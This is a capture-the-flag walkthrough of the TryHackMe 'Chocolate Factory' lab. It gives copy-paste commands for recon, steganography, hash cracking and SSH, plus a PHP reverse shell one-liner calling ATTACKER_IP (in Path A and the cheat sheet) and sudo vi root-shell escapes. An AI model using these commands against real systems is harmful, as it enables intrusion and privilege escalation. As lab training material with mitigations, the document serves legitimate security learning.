# Chocolate Factory — Consolidated Walkthrough

> **Difficulty:** Easy &nbsp;|&nbsp; Linux / Web / Privilege Escalation  
> **Goal:** Capture the `user` and `root` flags on the TryHackMe *Chocolate Factory* machine.

---

> **Summary:**  
> Enumerate services → discover FTP image (steganography) or web injection → recover credentials → obtain shell as `www-data` or SSH as `charlie` → escalate to `root` via misconfigured `sudo` (e.g., `vi`). This guide merges multiple community writeups into a single, streamlined path with copy-paste commands.  
> [Hacking Writeups][1]

---

## Table of Contents

1. [Overview](#overview)
2. [Tools & Prereqs](#tools--prereqs)
3. [High-level Attack Flow](#high-level-attack-flow)
4. [Step-by-step Walkthrough](#step-by-step-walkthrough)
    - [Recon](#recon)
    - [Path A — Web Shell via `home.php`](#path-a---web-shell-via-homephp)
    - [Path B — Stego via FTP Image](#path-b---stego-via-ftp-image)
    - [Privilege Escalation (vi → root)](#privilege-escalation-vi--root)
5. [Cheat Sheet — Commands](#cheat-sheet---commands)
6. [Defensive Notes & Mitigations](#defensive-notes--mitigations)
7. [References](#references)

---

## Overview

Chocolate Factory is a beginner-friendly box focusing on OSINT/enumeration, web exploitation, steganography, and privilege escalation via misconfigured `sudo`. Two main routes:  
- **A:** Abuse input on `home.php` for a PHP reverse shell (`www-data`).  
- **B:** Retrieve FTP image, extract embedded data, crack password, web login, and shell.  
Both paths lead to `charlie`’s credentials and root escalation.  
[Hacking Writeups][1]

---

## Tools & Prereqs

- **Attacker VM:** Kali / Parrot / any Linux
- **Tools:**  
  `nmap`, `gobuster`, `ftp`, `steghide`, `strings`, `base64`, `hashcat`/`john`, `nc`, `ssh`
- **Wordlists:**  
  `rockyou.txt` (for password cracking)

---

## High-level Attack Flow

1. **Enumerate:** `nmap` for open ports (FTP, HTTP, SSH)
2. **Web Recon:** `gobuster` for hidden files (`home.php`)
3. **Exploit:** Command injection or web login (after password crack) → reverse shell
4. **Loot:** Extract SSH key/password, SSH as `charlie`
5. **Escalate:** `sudo -l` → abuse `vi` for root shell

---

## Step-by-step Walkthrough

### Recon

```bash
nmap -sC -sV -p- -oA chocolate_nmap <TARGET_IP>
```
- Look for:  
  - `21/tcp` — FTP (anonymous access)  
  - `80/tcp` — Web server  
  - `22/tcp` — SSH

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 40 -o gobuster.log
```
- Commonly reveals `home.php` or similar.

---

### Path A — Web Shell via `home.php`

1. **Browse:** `http://<TARGET_IP>/home.php`
2. **Inject:** If input is vulnerable, spawn PHP reverse shell:

    ```bash
    # Attacker: start listener
    nc -lvnp 4444

    # Web input (as command)
    php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```

3. **Shell:** You get `www-data`. Enumerate:

    ```sh
    id
    ls -la
    cat /etc/passwd | grep charlie
    ```

4. **Loot:** Find `key_rev_key` binary, extract key:

    ```bash
    strings key_rev_key | less
    # or run interactively
    ./key_rev_key
    ```

5. **SSH:** Use extracted key/password:

    ```bash
    chmod 600 teleport
    ssh charlie@<TARGET_IP> -i teleport
    ```

---

### Path B — Stego via FTP Image

1. **FTP:** Connect and download image:

    ```bash
    ftp <TARGET_IP>
    # login: anonymous
    get gum_room.jpg
    ```

2. **Stego:** Extract embedded file:

    ```bash
    steghide extract -sf gum_room.jpg
    # (press Enter if passphrase is blank)
    ```

3. **Decode:** Base64 decode extracted file:

    ```bash
    cat b64.txt | base64 -d > hash.txt
    ```

4. **Crack:** Use `hashcat` or `john`:

    ```bash
    hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
    # OR
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ```

5. **Web Login:** Use cracked credentials, find shell or SSH key, proceed as above.

---

### Privilege Escalation (vi → root)

1. **Check sudo:**

    ```bash
    sudo -l
    ```

2. **Exploit:** If `vi` allowed:

    ```bash
    sudo vi -c ':!/bin/sh' /dev/null
    # or
    sudo vi -c ':set shell=/bin/sh' -c ':shell' /dev/null
    ```

3. **Root:** Read flag:

    ```bash
    whoami
    cat /root/root.txt
    ```

---

## Cheat Sheet — Commands

```bash
# Recon
nmap -sC -sV -p- -oA chocolate_nmap <TARGET_IP>
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 40 -o gobuster.log

# FTP
ftp <TARGET_IP>
get gum_room.jpg

# Stego
steghide extract -sf gum_room.jpg
cat b64.txt | base64 -d > hash.txt

# Crack hash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

# Web shell
nc -lvnp 4444
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# SSH key
strings key_rev_key | less
chmod 600 teleport
ssh charlie@<TARGET_IP> -i teleport

# Privilege escalation
sudo -l
sudo vi -c ':!/bin/sh' /dev/null
cat /root/root.txt
```

---

## Defensive Notes & Mitigations

- **Disable anonymous FTP** or restrict content.
- **Sanitize web inputs**; never execute user-supplied data.
- **Limit sudo privileges:** Avoid `NOPASSWD` for editors or command-line tools.
- **Monitor for stego/hidden files** on public services.
- **Alerting:** Watch for unusual web input, sudo usage, or new SUID files.

---


